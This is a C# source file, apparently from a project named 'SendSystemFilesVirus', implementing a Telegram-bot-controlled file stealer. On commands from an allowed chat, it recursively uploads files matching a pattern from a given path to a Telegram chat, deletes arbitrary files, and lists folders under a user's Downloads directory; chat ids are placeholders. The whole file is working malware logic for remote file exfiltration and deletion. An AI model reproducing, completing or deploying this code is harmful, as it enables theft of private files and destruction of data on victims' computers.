using System.Text;
using Telegram.Bot;
using Telegram.Bot.Polling;
using Telegram.Bot.Types;

namespace SendSystemFilesVirus
{
    public class TelegramService : IUpdateHandler
    {
        private readonly string _chatId = "chat_id";
        public static readonly TelegramBotClient _telegramBotClient = Worker._telegramBotClient;
        List<string> _chats = new List<string>() { "" };
        public async Task HandlePollingErrorAsync(ITelegramBotClient botClient, Exception exception, CancellationToken cancellationToken)
        {
            await _telegramBotClient.SendTextMessageAsync(_chatId, exception.Message);
        }

        public async Task HandleUpdateAsync(ITelegramBotClient botClient, Update update, CancellationToken cancellationToken)
        {
            try
            {
                if (_chats.Contains(update.Message.Chat.Id.ToString()))
                {
                    string[] t = update.Message.Text.Split("=>");
                    t[2] = string.IsNullOrEmpty(t[2]) ? "*" : t[2];
                    if (t[0].Equals("/GetFiles"))
                    {
                        await SendFilesFromPathAsync(t[1], t[2]);
                    }
                    else if (t[0].Equals("/RemoveFile"))
                    {
                        await RemoveFileFromPath(t[1]);
                    }
                    else
                    {
                        string[] findingDirectories = GetDirectoriesFromGivenRoot(@"C:\Users\User\Downloads\Telegram Desktop");
                        await SendTextArray(findingDirectories);
                    }
                    Console.WriteLine(update.Message.Text);
                }
            }
            catch (Exception ex)
            {
                await _telegramBotClient.SendTextMessageAsync(_chatId, ex.Message);
            }

        }

        private Task RemoveFileFromPath(string filePath)
        {
            System.IO.File.Delete(filePath);
            return Task.CompletedTask;
        }

        private async Task SendTextArray(string[] findingDirectories)
        {
            StringBuilder paths = new();
            List<string> SentItems = new();
            if (findingDirectories.Count() > 0)
            {
                for (int i = 0; i < findingDirectories.Count(); i++)
                {
                    if (!SentItems.Contains(findingDirectories[i]))
                    {
                        SentItems.Add(findingDirectories[i]);
                        paths.AppendLine(findingDirectories[i]);
                        if (i % 30 == 0)
                        {
                            await _telegramBotClient.SendTextMessageAsync(_chatId, paths.ToString());
                            paths.Clear();
                        }
                    }
                }
                await _telegramBotClient.SendTextMessageAsync(_chatId, paths.ToString());
                paths.Clear();
            }
        }

        private static string[] GetDirectoriesFromGivenRoot(string rootDir)
        {
            var options = new EnumerationOptions { IgnoreInaccessible = true, RecurseSubdirectories = true };
            return Directory.GetDirectories(rootDir, "*", options).ToArray();


            // drive.RootDirectory.GetDirectories("*", options)
            //.Where(x => !allPath.Contains(x.FullName)
            //&&!x.FullName.Contains(@"C:\Windows")
            //&& !x.FullName.Contains(@"C:\Program Files"))
            //.Select(x => x.FullName);
        }

        private async Task SendFilesFromPathAsync(string path, string pattern)
        {
            List<string> sendedFiles = new();
            string[] files = Directory.GetFiles(path, pattern, SearchOption.AllDirectories);


            foreach (string file in files)
            {
                if (!sendedFiles.Contains(file))
                {
                    using (var stream = System.IO.File.OpenRead(file))
                    {
                        if (stream.Length < 10 * 1024 * 1024 && stream.Length > 5)
                        {
                            var r = await _telegramBotClient.SendDocumentAsync(_chatId,
                                                            new Telegram.Bot.Types.InputFiles.InputOnlineFile(stream,Path.GetFileName( file)));
                            sendedFiles.Add(file);
                        }
                    }
                }
            }
        }

    }
}
